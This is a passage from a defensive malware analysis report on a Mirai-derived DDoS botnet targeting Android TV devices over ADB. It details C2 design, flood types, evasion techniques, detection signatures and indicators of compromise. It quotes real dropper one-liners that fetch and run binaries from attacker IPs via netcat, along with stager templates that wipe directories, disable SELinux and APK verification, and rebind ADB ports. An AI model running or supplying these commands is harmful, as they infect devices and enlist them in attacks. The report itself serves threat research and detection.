```

The wide spread across the ephemeral range makes port-based filtering impractical.

### C2 connection flow

1. Decrypt C2 domain from config slot 0x05 (primary) or 0x06 (fallback).
2. Resolve via DoH with up to 3 retries and provider failover.
3. Create TCP STREAM socket with keepalive (idle=30s, interval=10s, probes=3).
4. Set non-blocking (`O_NONBLOCK`).
5. Connect to resolved IP address on a randomly selected port from the port pool (24–84 ports, varying by build).
6. Perform XXTEA+ChaCha20 key exchange.
7. Enter main loop: receive 2-byte length prefix, decrypt payload, dispatch command.

#### argv[1] C2 variant

A set of full+scanner builds from March 2026 (`1a7a29b5`, `8f79486e`, `96acd74a`, `a9fb49c5`) take the C2 domain from `argv[1]` rather than the encrypted config. The binary copies `argv[1]` into a 32-byte buffer and resolves it at connection time. If no argument is provided, the bot exits. These builds contain no embedded C2 domain — config slots 0–2 are unused and the domain is supplied entirely by the dropper infrastructure.

This design decouples the C2 domain from the binary, making static config extraction insufficient for C2 discovery. The dropper can point the same binary at different C2 domains without recompilation. These builds use a handshake magic of `0x1CEB00DA` (continuing the operator's commitment to readable hex constants) and connect via a local UNIX-domain socket (`botd_single_lock`) for single-instance enforcement. The encrypted config retains the same 24-port pool from early builds (2663–59493) plus a 15-port secondary pool (16283–40319).

### Debug build C2 leak

The `214d25ce` debug build contains the C2 IP address **in cleartext** at `.rodata` offset `0x25300`:

**`158.94.210[.]88`**

This IP address was not present in the encrypted configs of the other builds. The debug build also exposes the XOR authentication key `PJbiNbbeasddDfsc` and internal function names.

## DDoS attack capabilities

The bot's attack capabilities expanded steadily across builds. The dispatch table maps attack type IDs to handler function pointers.

### Evolution timeline

| **Build** | **Date** | **Arch** | **Attacks** | **New methods** |
|---|---|---|---|---|
| `11c0447f` | Nov 2025 | x86 | 18 | Prototype: protocol-specific UDP floods (SSDP, LDAP, DNS, SNMP, RPC, SLP, mDNS, TeamSpeak); 4-byte XOR crypto; hardcoded C2 IP address |
| `c758c08c` | late 2025 | ARM | 9 | +RC4/ChaCha20/XXTEA crypto; domain-based C2 via raw DNS; protocol flood templates removed |
| `21c9e1` | early 2026 | ARM | 6 | Reduced to 6 core attack types (UDP×3, TCP×3) |
| `7d892083` | Jan 22 | ARM | 10 | +mbedTLS/DoH C2; +Minecraft, A2S_INFO, RakNet, connect flood |
| `214d25ce` | early Feb | ARM | 11 (0–10) | +FiveM getinfo |
| `38e49e9f` | Feb 10 | ARM | 14 (0–13) | +TCP handshake, GRE flood, NCP flood |
| `c654028d` | Mar 2026 | ARM | DDoS | Same core attacks; no scanner; ADB delivery |

**DDoS capability evolution**

### Full attack dispatch table (38e49e9f)

| **ID** | **Internal name** | **Socket** | **Protocol** | **Description** |
|---|---|---|---|---|
| 0 | `udp_plain` | DGRAM | UDP | Plain UDP flood, 1312-byte random payload |
| 1 | `udp_raw` | DGRAM | UDP | Small UDP flood, 1–22 byte payloads |
| 2 | `udp_vse` | DGRAM | UDP | Generic UDP flood, 1024-byte default |
| 3 | `tcp_socket` | RAW | TCP | SYN flood with IP spoofing, 52-byte packets |
| 4 | `tcp_ack` | RAW | TCP | ACK flood with IP spoofing, 512-byte payload |
| 5 | `tcp_stomp` | RAW | TCP | Real handshake then ACK data flood |
| 6 | `proxy` | STREAM | TCP | TCP connect flood, 256-connection pool |
| 7 | `udp_raknet` | DGRAM | UDP | Valve A2S_INFO query (mislabeled) |
| 8 | `tcp_minecraft` | DGRAM | UDP | RakNet Unconnected Ping (mislabeled) |
| 9 | `app_http` | STREAM | TCP | Minecraft Java login flood, port 25565 |
| **10** | `udp_fivem` | RAW | UDP | **FiveM getinfo probe, port 30120** |
| **11** | `tcp_handshake` | RAW | TCP | **PSH+ACK flood with real handshake** |
| **12** | `gre_flood` | RAW | GRE (47) | **GRE-encapsulated UDP flood** |
| **13** | `udp_socks` | DGRAM | UDP | **143-byte static template, port 524** |

**Complete attack dispatch table. Bold rows are new in 38e49e9f.**

#### Handler naming confusion

Several handler names inherited from the Mirai naming convention do not match the actual protocol on the wire. Three of fourteen handler names identify the wrong protocol. The function signatures were presumably trustworthy at some point in the fork history. The true protocol was determined by examining the payload templates copied from `.rodata` into attack packets:

| **ID** | **Internal name** | **Actual protocol** | **Evidence** |
|---|---|---|---|
| 6 | `proxy` | TCP connect flood | Creates 256 STREAM sockets, sends random data, reconnects on close. No SOCKS handshake or relay logic. |
| 7 | `udp_raknet` | Valve A2S_INFO | Copies 24-byte template from VA `0x80235`: `ff ff ff ff 54 53 6f 75 72 63 65 20 45 6e 67 69 6e 65 20 51 75 65 72 79` ("`\xffTSource Engine Query`"). This is the Valve A2S_INFO query format, not RakNet. |
| 8 | `tcp_minecraft` | RakNet Unconnected Ping (UDP) | Uses `SOCK_DGRAM` (UDP), not TCP. Copies 25-byte template from VA `0x8021c` starting with `01` (RakNet ID_UNCONNECTED_PING), containing the offline message magic `00 ff ff 00 fe fe fe fe fd fd fd fd` at offset 9 and a fixed GUID `47 73 80 19` at offset 21. |
| 9 | `app_http` | Minecraft Java login | Connects to port 25565 (0x63dd). Sends Minecraft protocol handshake with VarInt-encoded version 761 (1.19.4), followed by Login Start packet with randomized usernames from gamertag word lists. |

**Handler names vs. actual protocols (verified from Ghidra decompilation)**

### Game server targeting

The bot specifically targets gaming infrastructure:

| **Handler** | **Actual protocol** | **Target** | **Default port** |
|---|---|---|---|
| ID 7 | Valve A2S_INFO | Source Engine (CS2, TF2) | Any |
| ID 8 | RakNet Ping | Minecraft Bedrock / RakNet | Any |
| ID 9 | Minecraft Java login | Minecraft Java Edition | 25565 |
| ID 10 | Quake 3 getinfo | FiveM (GTA V multiplayer) | 30120 |

**Game server attack vectors**

The Minecraft login flood (ID 9) generates usernames using three wordlists with leet-speak substitutions (`o`→`0`, `e`→`3`, `a`→`4`, `s`→`5`, `b`→`6`, `t`→`7`, `g`→`9`). Example usernames: `xXSl4y3rPr0`, `DarkN1nj4TTV`, `Cy63rK1ll3r1337`. These would not have been out of place on Xbox Live circa 2007.

### Anti-mitigation techniques

| **Technique** | **Attacks** | **Mechanism** |
|---|---|---|
| IP spoofing | 3, 4, 10, 12 | Raw sockets with `IP_HDRINCL`; IPv4 only (no IPv6 raw socket support) |
| CIDR randomization | 10 | Source IP randomized within subnet |
| Real handshake | 5, 11 | Bypasses SYN cookies and stateful firewalls |
| GRE encapsulation | 12 | Wraps UDP in GRE tunnel, evades UDP filters |
| Protocol confusion | 7, 8 | Internal names don't match actual protocols |
| Connection pooling | 6, 9 | 256-socket pool for application-layer floods |

**Anti-mitigation techniques by attack type**

The TCP handshake flood (ID 11) is notable for its evasion approach: it completes a real 3-way handshake via a STREAM socket, then sends PSH+ACK data floods via a separate RAW socket using the captured sequence numbers. Because the attack uses legitimate established connections, it is not mitigated by SYN cookies and may evade some stateful inspection devices that track only connection setup.

The GRE flood (ID 12) constructs dual IP headers with a GRE tunnel header between them. The inner header carries UDP. An invariant links the IP ID fields: `inner_id = ~(outer_id - 1000)`.

### Attack parameter system

All attack handlers parse parameters from C2 commands via a common function (`FUN_0000b7f0` in `7d892083`, `FUN_0000c710` in `38e49e9f`). This allows the C2 operator to customize every aspect of attack traffic at runtime.

| **Index** | **Parameter** | **Default** | **Notes** |
|---|---|---|---|
| 0 | Payload size | Varies | Per attack type |
| 1 | Randomize payload | 1 | Fill with random data each iteration |
| 2 | IP TOS byte | 0 | Type of Service |
| 3 | IP identification | 0xffff | Random when 0xffff |
| 4 | IP TTL | 64 | Time to live |
| 5 | DF flag | 0 | Don't Fragment |
| 6 | Source port | 0xffff | Random when 0xffff |
| 7 | Destination port | Varies | Per attack type |
| 0x0b–0x10 | TCP flags | Varies | URG, ACK, PSH, RST, SYN, FIN |
| 0x11 | Sequence number | 0xffff | Random when 0xffff |
| 0x12 | ACK number | 0xffff | Random when 0xffff |
| 0x19 | Source IP override | Bot IP | For spoofing |
| 0x1c | Custom payload | — | User-supplied payload data |
| 0x1d–0x20 | GRE fields | — | Key, sequence, inner IP addresses (attack 12 only) |

**Configurable attack parameters**

## Bot behavior

### Installation and persistence

The dropper command (from `7d892083`, campaign `rhombus`):

```bash
cd /data/local/tmp; \
(toybox nc 5.187.35.158 1337 || busybox nc 5.187.35.158 1337 || \
nc 5.187.35.158 1337) > daemon; \
chmod 777 daemon; ./daemon rhombus; \
iptables -I INPUT 1 -i lo -p tcp -m multiport \
  --dports 5555,3222,12108 -j REJECT
```

A second dropper was found in the `38e49e9f` config (slot 49):

```bash
cd /data/local/tmp; su root; rm -rf instd; \
(toybox nc 130.12.180.126 1223 || busybox nc 130.12.180.126 1223) > instd; \
chmod 777 instd; ./instd
```

Both target Android devices (`/data/local/tmp`, `su root`) and download via netcat with fallback chains for compatibility.

#### ADB infection vector evolution (Jan – Mar 2026)

ADB exploitation was first observed on January 23 via a bare ADB shell command delivering the `daemon` binary from `5.187.35[.]158:1337`. Captured samples spanning the infection timeline trace the chain from this initial one-liner through six development iterations to its current polished form. The ADB exploitation vector, [first documented by Synthient](https://synthient.com/blog/a-broken-system-fueling-botnets) in the context of the Kimwolf botnet, leverages permissive residential proxy services to scan internal networks for ADB-exposed devices. All stagers target `/data/local/tmp` on Android devices and download payloads via `toybox nc` / `busybox nc` / `busybox1 nc` fallback chains.

**Phase 1 — bare delivery (Jan 23).** A single ADB shell command downloads and executes the ELF binary directly, with no stager script, no APK wrapping, and no persistence. The `pyramid` campaign tag and binary name `daemon` are already present. The command includes inline `iptables` rules blocking ports 5555, 3222, and 12108 — port-based anti-competition from the first observed session. Proxy routing via `localtest.me`.

**Phase 2 — scripted prototype (Feb 17).** Multi-step stager scripts from `192.206.117[.]19` and `160.22.79[.]29` introduce APK-based persistence: SELinux bypass (`echo 0 > /sys/fs/selinux/enforce`), `/system` partition remounting to modify `build.prop`, and cross-IP downloads (one script pulls from both IP addresses). APK package name: `com.example.bootsync` with `libarm7k.so`. Permissions explicitly granted via `pm grant`.

**Phase 3 — stabilized (Feb 19–22).** Scripts from `5.187.35[.]158` and `5.187.35[.]166` dropped SELinux hacks, standardized on `libgoogle.so`, added APK verification bypass (`settings put global verifier_verify_adb_installs 0` and `package_verifier_enable 0`), battery optimization whitelist (`dumpsys deviceidle whitelist`), and multi-method app start fallback chains. Package names: `com.google.android.gms.update`, `com.google.android.pms.update`. Added anti-competition: removes Snow (`com.android.docks`), Lorikazz (`com.oreo.mcflurry`), and two others.

**Phase 4 — hardened (Feb 24).** Added `/proc/<pid>/maps` scanner to kill processes with `(deleted)` memory mappings, a runtime anti-competition technique mirroring the `killer_maps` function in the ELF binary.

**Phase 5 — expanded infrastructure (Feb 27 – Mar 9).** Deployed across `203.188.174[.]195` (first seen Feb 27) and `.236`–`.242` (7 additional IP addresses in the same /24 from Mar 2). Package names expanded: `com.google.android.adm.update`, `com.google.android.env.update`, `com.google.play`. First script with a guard clause (`if pm list packages | grep -q "com.google.play"; then exit`).

**Phase 6 — consolidation (Mar 11+).** The `komaru` and `komugi` stagers (previously documented) plus new scripts from `206.81.9[.]186` remove additional rivals (`com.telenetd.telenet`, `com.example.jewboot`) and older Jackskid variants (`com.google.android.update`). The `com.google.alarm` APK wrapper adds five persistence mechanisms (boot receiver, JobScheduler, AlarmManager, CONNECTIVITY_CHANGE, PARTIAL_WAKE_LOCK). Changes ADB port to 22337 and wipes `/data/local/tmp/`.

**APK package name progression:**

| Package name | First seen | Native library | Architectures |
|-------------|------------|----------------|--------------|
| `com.example.bootsync` | Feb 17 | `libarm7k.so` | armeabi-v7a |
| `com.example.googledev` | Feb 17 | `libgoogle.so` | armeabi-v7a |
| `com.google.android.gms.update` | Feb 19 | `libgoogle.so` | armeabi-v7a |
| `com.google.android.pms.update` | Feb 22 | `libgoogle.so` | armeabi-v7a + arm64-v8a |
| `com.google.android.sys.update` | Mar 1 | `libgoogle.so` | armeabi-v7a + arm64-v8a |
| `com.google.android.adm.update` | Mar 2 | `libgoogle.so` | armeabi-v7a + arm64-v8a |
| `com.google.android.env.update` | Mar 2 | `libgoogle.so` | armeabi-v7a + arm64-v8a |
| `com.google.alarm` | Mar | `libandroid_runtime.so` → `libgoogle.so` | armeabi-v7a + arm64-v8a |
| `com.google.play` | Mar 9 | `libgoogle.so` | armeabi-v7a + arm64-v8a |
| `com.google.android.play` | Mar 23 | `libgoogle.so` | armeabi-v7a |

The progression from `com.example.*` (Android Studio's default new-project prefix) to `com.google.*` shows deliberate evolution toward more convincing system-app impersonation. The arm64-v8a architecture was added in the February 22 build.

**Campaign tags.** Each stager executes the ELF binary with a campaign-identifying argument: `meow`, `kieran`, `richylam`, `dai`, `litecoin`, `massload`, `gponfiber`, `uchttpd`, `pyramid`, `gonzo`. The `kieran` string also appears in `kieranellison.cecilioc2[.]xyz`, a C2 domain from the original config, suggesting a common operator or naming convention across the telnet and ADB campaigns. `gponfiber` and `uchttpd` suggest targeting of specific device types.

A parallel ADB vector distributes `com.system.update` from `87.121.84[.]74:13121` — a different malware family (Katana, a Mirai variant with on-device rootkit compilation) that shares infrastructure but not code with Jackskid. The Jackskid stagers explicitly remove this competitor.

#### Honeypot observations (Mar 17–18, 2026)

Honeypot captures from March 17–18 corroborate the ADB infection chain and reveal additional operational details not visible in static analysis alone.

**Proxy delivery mechanism.** The attacker routes ADB connections through HTTP CONNECT proxies. Eight of ten captured sessions began with `CONNECT step1.flowlayer[.]app:5555 HTTP/1.1`. Two earlier sessions (including the January 23 first observation) routed through `localtest.me:5555`. Both domains resolve to localhost/loopback addresses and are used as proxy-host headers, not as actual proxy services. The use of HTTP CONNECT proxies to reach ADB-exposed devices confirms the residential proxy abuse [documented by Synthient](https://synthient.com/blog/a-broken-system-fueling-botnets).

**Two stager patterns.** The captures show two distinct infection patterns co-existing in the wild:

*Redirect pattern* (associated with `instd` binary name): navigates to a writable directory, clears prior artifacts with `rm -rf *`, then downloads and executes via output redirection:
```
cd /data/local/tmp || cd /sdcard/0 || cd /storage/emulated/0; rm -rf *;
toybox nc <IP> <PORT> > instd || busybox nc ... > instd || busybox1 nc ... > instd;
chmod 777 instd; ./instd [tag]
```

*dd pattern* (associated with `arm7` binary name): downloads via `dd`, attempts privilege escalation with `su 0`, and rebinds ADB to a non-standard port in a single command:
```
(nc <IP> <PORT> || toybox nc ... || busybox nc ...) | dd of="/data/local/tmp/arm7";
chmod 777 /data/local/tmp/arm7; su 0 /data/local/tmp/arm7 [tag] || /data/local/tmp/arm7 [tag];
su 0 setprop service.adb.tcp.port 22337; su 0 setprop persist.adb.tcp.port 22337 ||
setprop service.adb.tcp.port 22337; setprop persist.adb.tcp.port 22337; > /dev/null 2>&1
```

The dd pattern adds `su 0` privilege escalation, ADB port rebinding (5555 → 22337), and stderr suppression. The binary name shift from `instd` to `arm7` and the addition of `setprop` persistence indicate this is a later iteration.

**Anti-competition in action.** A separate capture shows the stager attempting to uninstall both `google.android.sys.update` (an older Jackskid package) and `com.android.docks` (Snow), producing Java `DELETE_FAILED_INTERNAL_ERROR` exceptions with full `PackageManagerService` stack traces when neither package exists on the target. The clean-up routine runs unconditionally regardless of whether competitors are present.

**Campaign tags confirmed.** Two tags first identified in Phase 1 honeypot data were re-observed: `pyramid` (binary name `daemon`, IP `5.187.35[.]158:1337`, inline `iptables` rules blocking ports 5555, 3222, and 12108 — in use since the earliest observed ADB session on January 23) and `gonzo` (`instd`, IP `5.187.35[.]158:2448`, `localtest.me` proxy routing). The `pyramid` sessions are the only captures that include iptables port-blocking directly in the ADB shell command rather than in a separate stager script.

### Competitor neutralization

The bot aggressively suppresses rival botnets via multiple mechanisms:

- **`0clKiller` module** (named from the unstripped debug build `e46cbe2a`): Three kill methods: `killer_exe` (match `/proc/<pid>/exe` path), `killer_maps` (inspect `/proc/<pid>/maps` for statically-linked binaries using >30KB virt memory), `killer_stat` (analyze `/proc/<pid>/stat`). Self-exclusion via `readlink("/proc/self/exe")` path comparison and dual PID check. Searches 28 firmware directories.
- **`killer_mirai_exists` / `killer_mirai_init`**: Specifically detects and kills competing Mirai instances.
- **NETLINK process monitor**: Creates `AF_NETLINK` socket (proc connector) to receive real-time process creation events; kills new competitor processes within milliseconds of spawning. Falls back to `/proc` polling if NETLINK is unavailable.
- **Port blocking**: Blocks ports 5555 (ADB), 3222, 12108 via iptables to prevent reinfection. Drops traffic on port 2625 (another botnet family).
- **Netcat disabling**: Bind-mounts `/dev/null` over netcat binaries — pulling up the ladder after climbing aboard.

**ADB stager anti-competition:**

| Comment | Package | Operator/label |
|---------|---------|--------|
| `# snow` | `com.android.docks` | Snow (likely operator handle; see [Krebs, "Aisuru"](https://krebsonsecurity.com/2025/10/aisuru-botnet-shifts-from-ddos-to-residential-proxies/); also matches CatDDoS variant [v-snow_slide](https://blog.xlab.qianxin.com/catddos-derivative-en/)) |
| `# lorikazz` | `com.oreo.mcflurry` | Lorikazz |
| — | `com.android.boothandler` | Unknown |
| — | `com.android.clockface` | Unknown |
| — | `com.telnetd.telenet` | Telnet-based botnet |
| — | `com.example.jewboot` | Unknown |
| — | `com.google.android.update` | Older Jackskid (self-cleanup) |

The removal of `com.google.android.update` (an earlier Jackskid package name, without the `.pms`/`.gms`/`.sys` suffix) means the operator is uninstalling their own older infections.

### Anti-analysis

- Detects virtualization: qemu, vmware, virtualbox, xen, hyperv, kvm
- Detects sandboxes: virustotal, cuckoo, joebox, anubis, norman, threattrack, fireeye
- Detects forensic tools: tcpdump, wireshark, tshark, dumpcap
- OOM evasion: writes -1000 to `/proc/self/oom_score_adj` (the bot considers itself more essential than any process on the host, including `init`)
- Process hiding: rewrites `argv[0]` from a masquerade list (udhcpc, inetd, ntpclient, watchdog, etc.) — maximum camouflage via maximum tedium
- Environment hiding: clears environ pointers

### Propagation

Earlier builds (c758c08c through 38e49e9f) include a telnet scanner that binds ports 23 and 2323, brute-forces IoT devices using an embedded credential table (~204 pairs of ISP-specific, camera, and router defaults), and drops new payloads via netcat.

The `c654028d` variant (March 2026) **does not contain a telnet scanner or credential table**. No `busybox` probe strings, no `root`/`admin` credentials, no references to telnet ports, and no scanner logic are present in the binary. Propagation is fully externalized to ADB exploitation and the `komaru` stager. This represents a shift from self-propagating builds toward specialized payloads with external delivery tooling.

### UPX 5.02 in-memory unpacking

The `38e49e9f` build is packed with UPX 5.02. UPX 5.00 introduced ELF use of `memfd_create()`, which enables in-memory unpacking on supported kernels (Linux 3.17+). When available, the unpacked binary is executed from an anonymous file descriptor without being written to disk, reducing exposure to file-based scanning.

## Detection signatures

### High-confidence static payload signatures

These byte patterns are copied from `.rodata` into attack packets and are invariant.

#### Valve A2S_INFO (handler 7)

24-byte template at VA `0x80235`:
```
ff ff ff ff 54 53 6f 75 72 63 65 20 45 6e 67 69
6e 65 20 51 75 65 72 79
```

Detect: `\xff\xff\xff\xffTSource Engine Query` prefix with UDP payload > 100 bytes (legitimate queries are exactly 25 bytes).

#### RakNet Unconnected Ping (handler 8)

25-byte template at VA `0x8021c`:
```
01 00 00 00 00 3a f2 1b 38 00 ff ff 00 fe fe fe
fe fd fd fd fd 47 73 80 19
```

Detect: RakNet magic at offset 9 + **fixed** timestamp `3af21b38` + **fixed** GUID `47738019` (legitimate clients randomize these).

#### FiveM getinfo (handler 10)

15-byte template: `\xff\xff\xff\xffgetinfo xyz`

Default port 30120. The `xyz` parameter is non-standard (legitimate queries use `getinfo` or `getinfo\n`).

#### TCP SYN fingerprint (handler 3)

12-byte TCP options: `02 04 05 b4 01 01 04 02 01 03 03 08`

MSS=1460, NOP, NOP, SACK Permitted, NOP, Window Scale=8. Total IP length: exactly 52 bytes. This exact sequence does not match any real OS TCP stack.

#### NCP template (handler 13)

143-byte static template on port 524 (NCP). Only bytes 8–11 vary per packet. Anchor patterns:

```
Offset 22:  e0 c0 05 80 81 02 f1 ea f5 4f
Offset 60:  60 5d 4c 4f 01 e0 0c 89 86 3a
Offset 128: 02 88 90 08 81 76 e3 ff ff ff ff ff ff ff f0
```

### YARA rule

The production YARA rule is maintained in [`jackskid_ddos_botnet.yar`](../jackskid_ddos_botnet.yar). It uses multi-tier detection logic: high-confidence matching on the RC4 cipher key or `FrshPckBnnnSplit` passphrase, medium-confidence matching on DDoS payload templates combined with crypto indicators, and exclusion logic to avoid Cecilio false positives. The medium-confidence DDoS template condition requires the Jackskid-specific TCP SYN options fingerprint (`$tcp_syn_opts`) to avoid false positives on generic Mirai variants that happen to include ChaCha20 and common attack payloads like A2S_INFO or RakNet.

---

## Sample inventory

| **Hash (short)** | **Date** | **Arch** | **Size** | **Attacks** | **Packing** | **Build type** |
|---|---|---|---|---|---|---|
| `11c0447f` | Nov 2025 | x86 | 67 KB | 18 | UPX | Release |
| `c758c08c` | late 2025 | ARM | 132 KB | 9 | None | Release |
| `21c9e1` | early 2026 | ARM | 128 KB | 6 | None | Release |
| `7d892083` | Jan 22 | ARM | 562 KB | 10 | None | Release |
| `214d25ce` | early Feb | ARM | 125 KB | 11 | None | **Debug** |
| `38e49e9f` | Feb 10 | ARM | 272 KB (packed) | 14 | UPX 5.02 | Release |
| `c654028d` | Mar 2026 | ARM | 577 KB | DDoS | None | **DDoS-only variant** |
| `e46cbe2a` | Feb 19 | ARM | 160 KB | 16 | None | **Debug (unstripped)** |
| `bcd77b76` | Feb 27 | ARM | 573 KB | DDoS | None | ADB; C2: `www.ipmoyu[.]xyz` |
| `0728f540` | Mar 9 | ARM | 574 KB | 16–17 | None | ADB; C2: `peer.ipmoyu[.]xyz` |
| `a06aacf9` | Mar 15 | ARM | 573 KB | 16–17 | None | ADB; C2: `nodes.ipmoyu[.]xyz` |
| APKs (12) | Feb–Mar | ARM | 589 KB–1.3 MB | — | None | 9 package names |
| ADB stagers (13) | Feb–Mar | script | 0.6–2.6 KB | — | — | ADB dropper scripts |
| `Mar 2026 wave` | Mar 10–13 | multi | 55–356 KB | var | None | **Crossover (28)** |
| `1a7a29b5` | Mar 2026 | ARM | 254 KB | 16–17 | None | Full+scanner; argv C2 |
| `8f79486e` | Mar 2026 | x86-64 | 236 KB | 16–17 | None | Full+scanner; argv C2 |
| `96acd74a` | Mar 2026 | MIPS BE | 356 KB | 16–17 | None | Full+scanner; argv C2 |
| `a9fb49c5` | Mar 2026 | ARM EABI4 | 229 KB | 16–17 | None | Full+scanner; argv C2 |
| `516c532a` | Mar 23 | ARM | 565 KB | DDoS | None | **ENS C2** (`m3rnbvs5d.eth`) |
| `f0e1cf09` | Mar 23 | x86-64 | 164 KB | DDoS+scanner | None | **Lite** (hardcoded C2, no TLS) |
| Lite builds (4) | Mar 23 | multi | 164–272 KB | DDoS+scanner | None | Hardcoded `185.196.41[.]180` |

**Analyzed samples**

The earliest build (`11c0447f`) is an x86 prototype with 18 DDoS attack types (including protocol-specific UDP floods using SSDP, DNS, SNMP, and LDAP templates, later removed), primitive 4-byte XOR config encryption, and a hardcoded C2 IP address. The `c758c08c` and `21c9e1` builds introduced the full RC4+ChaCha20+XXTEA crypto stack with 6–9 attack types, using raw DNS for C2 resolution. Later builds (`7d892083`, `38e49e9f`) added statically linked mbedTLS for DNS-over-HTTPS C2 resolution, growing to 562 KB and 10–14 attack types.

The `c654028d` build (March 2026) marks a shift in delivery: deployed via ADB exploitation on Android TV devices, wrapped in a `com.google.alarm` APK with five persistence mechanisms. It carries the same cipher and crypto stack as `38e49e9f` (confirmed by static config decryption) but strips the telnet scanner and credential table. Propagation is fully externalized to the `komaru` shell stager.


#### Representative samples

*The following samples are referenced throughout the report:*

The samples analyzed in this report span all three phases:

- **`11c0447f`** (Nov 2025): Early x86 build. UPX-packed, 67 KB unpacked. First sample documented by Foresiet.

- **`c758c08c`** (late 2025): Early ARM build. 132 KB, not UPX-packed. Reported by XLab.

- **`7d892083`** (Jan 22): ARM release build. 10 DDoS attack types, DNS-over-HTTPS C2 resolution, encrypted config with key `DEADBEEF CAFEBABE`. Campaign ID `rhombus`.

- **`214d25ce`** (early Feb): ARM debug/development build. 11 attack types (+FiveM). Hardcoded cleartext C2 at `158.94.210[.]88`, verbose logging with function names, no UPX packing.

- **`38e49e9f`** (Feb 10): ARM production build. 14 attack types (+GRE flood, TCP handshake flood, NCP flood). UPX 5.02 packing with in-memory unpacking support. 10 C2 domains decrypted from config, 60-port rotation pool.

- **`c654028d`** (Mar 2026): ARM DDoS-only variant (`richy`). Deployed via ADB exploitation on Android TV boxes with `com.google.alarm` APK persistence wrapper. Single C2 domain (`nodes.ipmoyu[.]xyz`), expanded 84-port pool. No telnet scanner or credential table — propagation fully externalized to ADB/stager tooling. Same cipher key and crypto stack as `38e49e9f`, confirmed via static config decryption.

- **ADB campaign samples** (Jan 23 – Mar 16): 38 unique samples covering the full ADB infection timeline. Includes 12 ELF ARM binaries spanning 4 C2 domain generations (`boatdealers[.]su` → `www.ipmoyu[.]xyz` → `peer.ipmoyu[.]xyz` → `nodes.ipmoyu[.]xyz`), 12 APKs with 9 distinct package names, 13 ADB stager scripts, and an unstripped debug build (`e46cbe2a`) revealing internal project name `softbot` and `0clKiller` module naming. Config decryption confirmed the same `DEADBEEF CAFEBABE` key across all builds. Attack type count grew to 16–17 with the addition of an HTTP GET flood (`Mozilla/5.0` UA) and HTTP/2 DoH support.

- **ENS C2 build** (`516c532a`, Mar 23): ARM ELF, 565 KB. Resolves C2 via Ethereum Name Service (`m3rnbvs5d.eth`, text record key `k1er4n`). IPv6→IPv4 XOR `0xA5` decode. 90-port pool. TLS without XXTEA (`FrshPckBnnnSplit` absent). Deployed from `176.65.139[.]72` as `com.google.android.play` APK wrapper. Competition kill list: `jilcore.6.so`, `jipplib.1.so`, `jibdata.2.so`, `jiblib.5.so`.

- **Lite scanner builds** (`f0e1cf09` + 3 others, Mar 23): 164–272 KB, no TLS, no DNS. Hardcoded C2 `185.196.41[.]180`, 24-port pool, cron `kworker` persistence, `botd_single_lock` coordination socket on port 34942. Telnet scanner with credential table included.

- **March 2026 wave** (Mar 10–13): 28 samples across three build tiers: (1) 5 stripped DDoS-only builds (55–92 KB, ARM/MIPS/x86_64) with C2 at `158.94.210[.]71` / `ricocaseagainst.rebirth[.]st` and bot tag "here we are"; (2) 12 full debug builds (130–178 KB, multi-arch) with C2 at `185.196.41[.]180` (VDSKA-NL, AS400992/AS50053), bot tag "init ready", `PJbiNbbeasddDfsc` XXTEA key, `botd_single_lock` mutex, kworker masquerade, and cron persistence; (3) 11 full+scanner builds (228–356 KB, multi-arch) with IoT credentials, systemd persistence (`dbus-kworker.service`), and anti-VM checks. All 28 share the `DEADBEEF CAFEBABE E0A4CBD6 BADC0DE5` cipher key. The 23 full/scanner builds are Aisuru–Jackskid crossover builds, sharing C2 IP address `185.196.41[.]180` and `PJbiNbbeasddDfsc` XXTEA key with Aisuru sample `7500925a`. The `rebirth[.]st` domain and filename "rebirthstresswashere" link the stripped builds to the Rebirth stresser brand. For a group that encrypts its configs with three layers, the filename is remarkably forthcoming.

## Indicators of compromise

### File hashes

| **Build** | **Hashes** |
|---|---|
| Nov 2025 (x86) | SHA-256: `11c0447f524d0fcb3be2cd0fbd23eb2cc2045f374b70c9c029708a9f2f4a4114` |
| late 2025 (ARM) | SHA-256: `c758c08c9126d55348c337ee1b3a6eb90e68e3ffc1ad5ceb9f969faee80b2c0b` |
| early 2026 (ARM) | SHA-256: `21c9e1189e8447ddb5e233401d47ac4be0321d988e081a75a074d4414cf1a5a8` MD5: `611bf253e9c7ab256f6b5f512fad06cc` |
| Jan 22 (ARM) | SHA-256: `7d892083038b4fb4189d1dec4a087bbea4a9fd7a8ffa0850f9cccb2b2b2c9409` MD5: `d8c3455a8aca8efd54f7aee2d1d39659` |
| early Feb (ARM) | SHA-256: `214d25cebb469d68868551ecda4744ab2757a7648a84be8abb26aa94a29614c0` MD5: `eb985b855e36e1bb4352ac20c750c486` |
| Feb 10 (packed) | SHA-256: `38e49e9fe590fc2e9f652820d5b3a70210bf10df3e08f40a121e123c7c6c3b5f` MD5: `7de34294c217b8166834e1c69476b5a2` |
| Feb 10 (unpacked) | SHA-256: `ea4f52388f441d93f05a623fb98536fbedad629e386acefceed4bfd8d53a63a4` |
| Mar 2026 (richy) | SHA-256: `c654028d4e9cc619b195f2d1411236ed863b2dd7a86f78ff8e33ccb9fce4682c` |
| Mar 2026 (komaru) | SHA-256: `08e0a7918214c78e63c89adcb62074c416b2c61729116a773d40ca436e596d42` |
| Mar 2026 (APK) | SHA-256: `41474b00b02b03fca4fa0e6765d690d540b9a19b11478006acdd865d845ebe9a` Package: `com.google.alarm` |
| Mar 2026 wave | Representative hashes (28 total): `ee7981a8` (stripped, ARM) `a241a921` (full debug, multi-arch) `1523cad7` (full+scanner, multi-arch) `bd6a93a6` (full+scanner, multi-arch) |
| Mar 2026 (argv C2) | SHA-256: `1a7a29b58ebff5b828407918fc197ed6c299bfd35bd6ae1b57c7ecc924ba59d8` (ARM) `8f79486ecaea3f2df3dbfbdce3024fd24dd55bdf4c71e679610fb42725a34efa` (x86-64) `96acd74ad9b038ec567ca571b7e235b6a7c9a533fbdbf66c0e16179eb61e6e1a` (MIPS) `a9fb49c5dd0ee89153ae14210d0d1d2a27e026fdbc958d7cb75f418c7f6d485e` (ARM) |
| Mar 23 (ENS C2) | SHA-256: `516c532affa516943580781a6b6c318c28f4a11b5e56f66ed3adb2f13d32b8ba` (ARM ELF) `4a9c611455192a91d9289f6c318773d4bdd339edc04a359be4905e4f6e4a4a54` (APK, `com.google.android.play`) |
